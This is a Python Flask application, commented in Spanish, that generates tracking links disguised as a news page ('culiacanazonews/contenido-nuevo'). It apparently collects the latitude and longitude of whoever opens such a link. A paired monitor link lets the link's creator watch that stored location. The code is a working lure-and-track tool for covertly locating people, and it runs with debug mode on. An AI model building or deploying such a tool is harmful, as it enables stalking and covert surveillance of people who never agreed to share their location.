from flask import Flask, request, jsonify, send_from_directory, render_template
from flask_cors import CORS
from uuid import uuid4
import json
import os

app = Flask(__name__)
CORS(app)

DATA_FILE = "ubicaciones.json"

# Página de usuario
@app.route('/')
def inicio():
    return send_from_directory('templates', 'index.html')

# Ruta para recibir la ubicación (POST)
@app.route('/ubicacion', methods=['POST'])
def recibir_ubicacion():
    data = request.get_json()
    session_id = data.get('session_id')

    # Verificar que los datos necesarios están presentes
    if not session_id or 'lat' not in data or 'lng' not in data:
        return jsonify({"error": "Faltan datos"}), 400

    # Guardar la ubicación en el archivo
    with open(DATA_FILE, 'r+') as f:
        ubicaciones = json.load(f)
        ubicaciones[session_id] = data
        f.seek(0)
        json.dump(ubicaciones, f, indent=2)
        f.truncate()

    return jsonify(success=True)

# Ruta para obtener la ubicación (GET)
@app.route('/ubicacion', methods=['GET'])
def obtener_ubicacion():
    session_id = request.args.get('session_id')  # Obtiene el 'session_id' de la URL
    with open(DATA_FILE, 'r') as f:
        ubicaciones = json.load(f)  # Lee el archivo JSON
    ubicacion = ubicaciones.get(session_id, None)  # Busca la ubicación por 'session_id'
    if ubicacion is None:
        return jsonify({"error": "Session ID not found"}), 404  # Si no se encuentra, devuelve 404
    return jsonify(ubicacion)  # Devuelve la ubicación si se encuentra


# Página de monitoreo
@app.route('/monitor')
def monitor():
    return send_from_directory('templates', 'monitor.html')

# Página del generador de enlaces
@app.route('/culiacanazonews/contenido-nuevo')
def tracker():
    return send_from_directory('templates', 'tracker.html')

# Generación de enlace (GET y POST)
@app.route('/generar', methods=['GET', 'POST'])
def generar():
    enlace = monitor = None
    if request.method == 'POST':
        session_id = str(uuid4())
        enlace = f"http://localhost:5000/culiacanazonews/contenido-nuevo?session_id={session_id}"
        monitor = f"http://localhost:5000/monitor?session_id={session_id}"
    return render_template("generar.html", enlace=enlace, monitor=monitor)

if __name__ == '__main__':
    # Crear el archivo de ubicaciones si no existe
    if not os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'w') as f:
            json.dump({}, f)

    app.run(debug=True)
